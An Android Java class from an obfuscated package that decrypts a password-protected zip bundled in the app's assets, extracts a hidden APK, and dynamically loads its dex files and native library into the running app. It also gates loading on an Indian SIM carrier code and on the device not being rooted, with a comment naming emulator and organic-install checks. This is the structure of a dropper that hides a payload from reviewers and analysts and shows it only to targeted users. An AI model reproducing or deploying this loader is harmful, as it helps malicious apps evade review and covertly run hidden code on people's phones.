package com.d08a3hqr;

import android.app.Application;
import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import com.d08a3hqr.utils.FilePath;
import com.d08a3hqr.utils.FileUtils;

import java.io.File;
import java.util.ArrayList;

/**
 * 从C:\work\code\github\App\j14helloword-jni\lib_load_jni\build\intermediates\library_and_local_jars_jni\release\jni下找到so跟apk一起压缩
 */
public class Init {
    public static String assetsName = "";
    public static Context app;

    public static void init(Context context, String password, String assetsN, boolean isDebug) {
        Init.app = context;
        Init.assetsName = assetsN;
        if (context != null) {
            Context applicationContext = context.getApplicationContext();
            if (applicationContext != null) {
                Init.app = applicationContext;
            }
        }
        try {
            String[] plugins = context.getAssets().list(Init.assetsName);
            // 没有文件就不处理
            if (plugins.length < 1) {
                return;
            }
            // 没有解压，就执行文件操作
            String pluginPath = "";
            if (!FileUtils.hasFiles(FilePath.getPluginUnzipDir())) {
                // 先删除
                boolean deleteFile = FileUtils.delete(FilePath.getRootLoadDir());
                // 复制分卷
                long start0 = System.currentTimeMillis();
                String subsectionName = "";
                for (String fileName : plugins) {
                    if (fileName.endsWith(".zip")) {
                        subsectionName = fileName;
                    }
                    String subsectionPath = FilePath.getPluginSubsectionPath() + File.separator + fileName;
                    FileUtils.copyAssetsFile(context, Init.assetsName + File.separator + fileName, subsectionPath);
                }
                // 解压、解密分卷
                String subsectionPath = FilePath.getPluginSubsectionPath() + File.separator + subsectionName;
                FileUtils.unzipFileByPassword(subsectionPath, FilePath.getPluginPath(), password);
                pluginPath = getPluginPath();
                // 解压apk文件
                FileUtils.unzipFile(pluginPath, FilePath.getPluginUnZipPath());
            } else {
                pluginPath = getPluginPath();
            }
            // dex集合
            ArrayList<File> dexFiles = new ArrayList<>();
            File[] files = FilePath.getPluginUnzipDir().listFiles();
            for (File file : files) {
                if (file == null) {
                    continue;
                }
                if (file.getName().endsWith(".dex") || file.getName().endsWith(".jar")) {
                    dexFiles.add(file);
                }
            }
            // 加载lib_load_jni_c
            if (isDebug) {
                System.loadLibrary("load");
            } else {
                System.load(getSoPath());
            }
            // 开始加载插件
            Sd08a3hqrtart.load((Application) app, getLibFiles(), dexFiles, FilePath.getOatDir(), pluginPath);
        } catch (Throwable t) {
            Log.e("Start", "init", t);
        }
    }

    public static String getPluginPath() {
        String[] list = FilePath.getPluginDir().list();
        String name = "";
        for (String fileName : list) {
            if (fileName.endsWith(".apk")) {
                name = fileName;
                break;
            }
        }
        String pluginPath = FilePath.getPluginPath() + File.separator + name;
        return pluginPath;
    }

    public static ArrayList<File> getLibFiles() {
        String abi = getAbi();
        File[] files = FilePath.getPluginUnZipLibDir().listFiles();
        File abiFile = null;
        ArrayList<File> libFiles = new ArrayList<>();
        for (File file : files) {
            if (file == null) {
                continue;
            }
            if (TextUtils.equals(file.getName(), abi)) {
                abiFile = file;
                continue;
            }
            libFiles.add(file);
        }
        if (abiFile != null) {
            libFiles.add(0, abiFile);
        }
        return libFiles;
    }

    public static String getSoPath() {
        String abi = getAbi();
        File[] files = FilePath.getPluginUnAarJniAbiDir(abi).listFiles();
        return FilePath.getPluginUnAarJniAbiPath(abi) + File.separator + files[0].getName();
    }

    public static String getAbi() {
        // armeabi，armeabi-v7a，x86，mips，arm64-v8a，mips64，x86_64
        String abi;
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            abi = Build.CPU_ABI;
        } else {
            abi = Build.SUPPORTED_ABIS[0];
        }
        if (TextUtils.isEmpty(abi)) {
            abi = "arm64-v8a";
        }
        return abi;
    }

    /**
     * 印度卡、没有root、不是模拟器、非自然
     */
    public static boolean isLoadB(Context context) {
        // 印度卡
        if (!isIndia(context)) {
            return false;
        }
        // root
        if (isRoot()) {
            return false;
        }
        return true;
    }

    public static boolean isIndia(Context context) {
        TelephonyManager telManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (telManager == null) {
            return false;
        }
        String operator = telManager.getSimOperator();
        if (operator != null && !operator.isEmpty()) {
            String mcc = operator.substring(0, 3);
            if (mcc.equals("404") || mcc.equals("405") || mcc.equals("406")) {
                return true;
            }
        }
        return false;
    }

    public static boolean isRoot() {
        boolean hasRootDir = false;
        String[] rootDirs;
        String[] rootRelatedDirs = new String[]{"/su", "/su/bin/su", "/sbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/data/local/su", "/system/xbin/su", "/system/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/system/bin/cufsdosck", "/system/xbin/cufsdosck", "/system/bin/cufsmgr", "/system/xbin/cufsmgr", "/system/bin/cufaevdd", "/system/xbin/cufaevdd", "/system/bin/conbb", "/system/xbin/conbb"};
        int dirCount = (rootDirs = rootRelatedDirs).length;
        for (int i = 0; i < dirCount; ++i) {
            String dir = rootDirs[i];
            if ((new File(dir)).exists()) {
                hasRootDir = true;
                break;
            }
        }
        return Build.TAGS != null && Build.TAGS.contains("test-keys") || hasRootDir;
    }
}
